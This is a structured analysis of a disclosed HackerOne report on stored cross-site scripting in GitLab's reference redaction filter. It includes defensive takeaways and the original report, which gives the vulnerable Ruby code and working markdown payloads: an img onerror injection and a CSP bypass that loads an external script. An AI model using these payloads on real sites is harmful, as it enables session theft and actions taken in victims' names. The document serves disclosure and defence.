# Stored XSS in Markdown via ReferenceRedactorFilter data-original Attribute

## Metadata
- **Source:** HackerOne
- **Report:** 836649 | https://hackerone.com/reports/836649
- **Submitted:** 2020-04-01
- **Reporter:** vakzz
- **Program:** GitLab
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Stored Cross-Site Scripting (XSS), HTML Injection, Improper Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in GitLab's ReferenceRedactorFilter where the `data-original` attribute containing HTML-encoded content is decoded and reused without proper sanitization. An attacker can inject arbitrary HTML/JavaScript by crafting malicious markdown links to private resources, which gets executed when the reference is redacted for users without access.

## Attack scenario
1. Attacker creates a private GitLab project under their control
2. Attacker posts a comment on a public project/issue containing a specially crafted markdown link to their private project with HTML-encoded XSS payload in the link text
3. When users without access to the private project view the comment, GitLab's ReferenceRedactor processes the redacted reference
4. The `data-original` attribute containing HTML-encoded payload (e.g., `&lt;img onerror=alert(1)&gt;`) is extracted and decoded
5. The decoded HTML is inserted into the page without sanitization, executing the injected script/HTML
6. Attacker achieves code execution in victim's browser, potentially stealing session tokens or performing actions on their behalf

## Root cause
The ReferenceRedactorFilter's `redacted_node_content()` method extracts the `data-original` attribute value and directly interpolates it into HTML output without proper encoding or sanitization. The attribute stores user-controlled data that may contain HTML entities, which are decoded during rendering, allowing XSS injection when the reference is redacted.

## Attacker mindset
An attacker recognizes that HTML-encoded payloads in the `data-original` attribute bypass initial encoding because they are treated as data attributes rather than content, and that the redaction process decodes this data without re-sanitization. The attacker leverages the ability to reference private resources to inject malicious content visible only to users without access permissions.

## Defensive takeaways
- Always perform context-appropriate output encoding (HTML encoding for HTML context) on user-controlled data before insertion, regardless of prior encoding stages
- Never assume that data stored in attributes is safe for direct use in other contexts without re-validation
- Implement multiple layers of defense: input validation, output encoding, and Content Security Policy
- Apply allowlist-based filtering for reference redaction rather than string manipulation
- Use templating engines that auto-escape by default rather than manual string concatenation
- Sanitize HTML content using well-maintained libraries (e.g., Ruby Sanitize gem) before storing in data attributes
- Test security boundaries between permission levels - ensure redaction doesn't leak executable content

## Variant hunting
Search for similar `data-*` attribute extraction and reuse patterns in markdown/reference processors
Audit other filter classes that handle reference redaction or permission-based content filtering
Examine any locations where `node.attr()` is called and the value is directly interpolated into HTML output
Test other data attributes (data-link-reference, href, etc.) for similar injection vectors
Check comment systems, wiki pages, and other markdown-rendered areas for the same vulnerability
Investigate if other entities besides links can be redacted and abused similarly

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1059 - Command and Scripting Interpreter
- T1539 - Steal Web Session Cookie
- T1566 - Phishing

## Notes
The report includes two payloads: one basic XSS blocked by CSP and an advanced CSP bypass using data-remote and data-method attributes to load external scripts. The vulnerability requires the victim to view content posted by the attacker, making it suitable for widespread social engineering. The fix should double-encode or use a HTML sanitization library on the `data-original` attribute value.

## Full report
<details><summary>Expand</summary>

### Summary
It's possible to inject arbitrary html into the markdown by abusing the ReferenceRedactorFilter. This is due to the `data-original` attribute allowing html encoded data to be stored, which is then extracted and used as the link content. If the original data already is html encoded then it will be unencoded after it is redacted:

```ruby
    def redacted_node_content(node)
      original_content = node.attr('data-original')
      link_reference = node.attr('data-link-reference')

      # Build the raw <a> tag just with a link as href and content if
      # it's originally a link pattern. We shouldn't return a plain text href.
      original_link =
        if link_reference == 'true'
          href = node.attr('href')
          content = original_content

          %(<a href="#{href}">#{content}</a>)
        end

      # The reference should be replaced by the original link's content,
      # which is not always the same as the rendered one.
      original_link || original_content || node.inner_html
    end
```

### Steps to reproduce
1. create a private project with one account
1. create an issue in the private project
1. sign into another account that does not have permission to read the above project
1. comment on an issue linking to the private issue using the following:

    ```markdown
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>
    ```
1. The rendered markdown contains the injected html:

    ```html
<div class="md"><p data-sourcepos="1:1-1:124" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">xss <img onerror="alert(1)" src="x"></a></p></div>
    ```

The above is blocked by the csp, but that can be bypassed similar to https://hackerone.com/reports/662287#activity-6026826 (requires clicking anywhere on the page, but the link is full screen):

```markdown
link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1" title="title">csp 
&lt;a 
  data-remote=&quot;true&quot;
  data-method=&quot;get&quot;
  data-type=&quot;script&quot;
  href=/wbowling/wiki/raw/master/test.js
  class='atwho-view select2-drop-mask pika-select'
&gt;
  &lt;img height=10000 width=10000&gt;
&lt;/a&gt;
</a>
```

which generates the following html:
```html
<div class="md issue-realtime-trigger-pulse"><p data-sourcepos="1:1-11:4" dir="auto">link: <a href="https://gitlab.com/wbowling/private-project/-/issues/1">csp
</a><a data-remote="true" data-method="get" data-type="script" href="/wbowling/wiki/raw/master/test.js" class="atwho-view select2-drop-mask pika-select">
<img height="10000" width="10000">
</a>
</p></div>
```

### Impact
Anywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss

### Examples
* example payload: https://gitlab.com/vakzz-h1/stored-xss/-/issues/1
* with csp bypass (requires clicking anywhere on the page): https://gitlab.com/vakzz-h1/stored-xss/-/issues/2

### What is the current *bug* behavior?
The `data-original` attribute can be abused to inject arbitrary html when a reference is redacted.

### What is the expected *correct* behavior?
The `data-original` should be double encoded or filtered before being reused.

### Relevant logs and/or screenshots
{F769570}

### Output of checks
Happens on gitlab.com

#### Results of GitLab environment info

```
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.24.1
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.9.2-ee
Revision:	0ad76f4d374
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.12
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	12.0.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Anywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss

</details>

---
*Analysed by Claude on 2026-05-12*
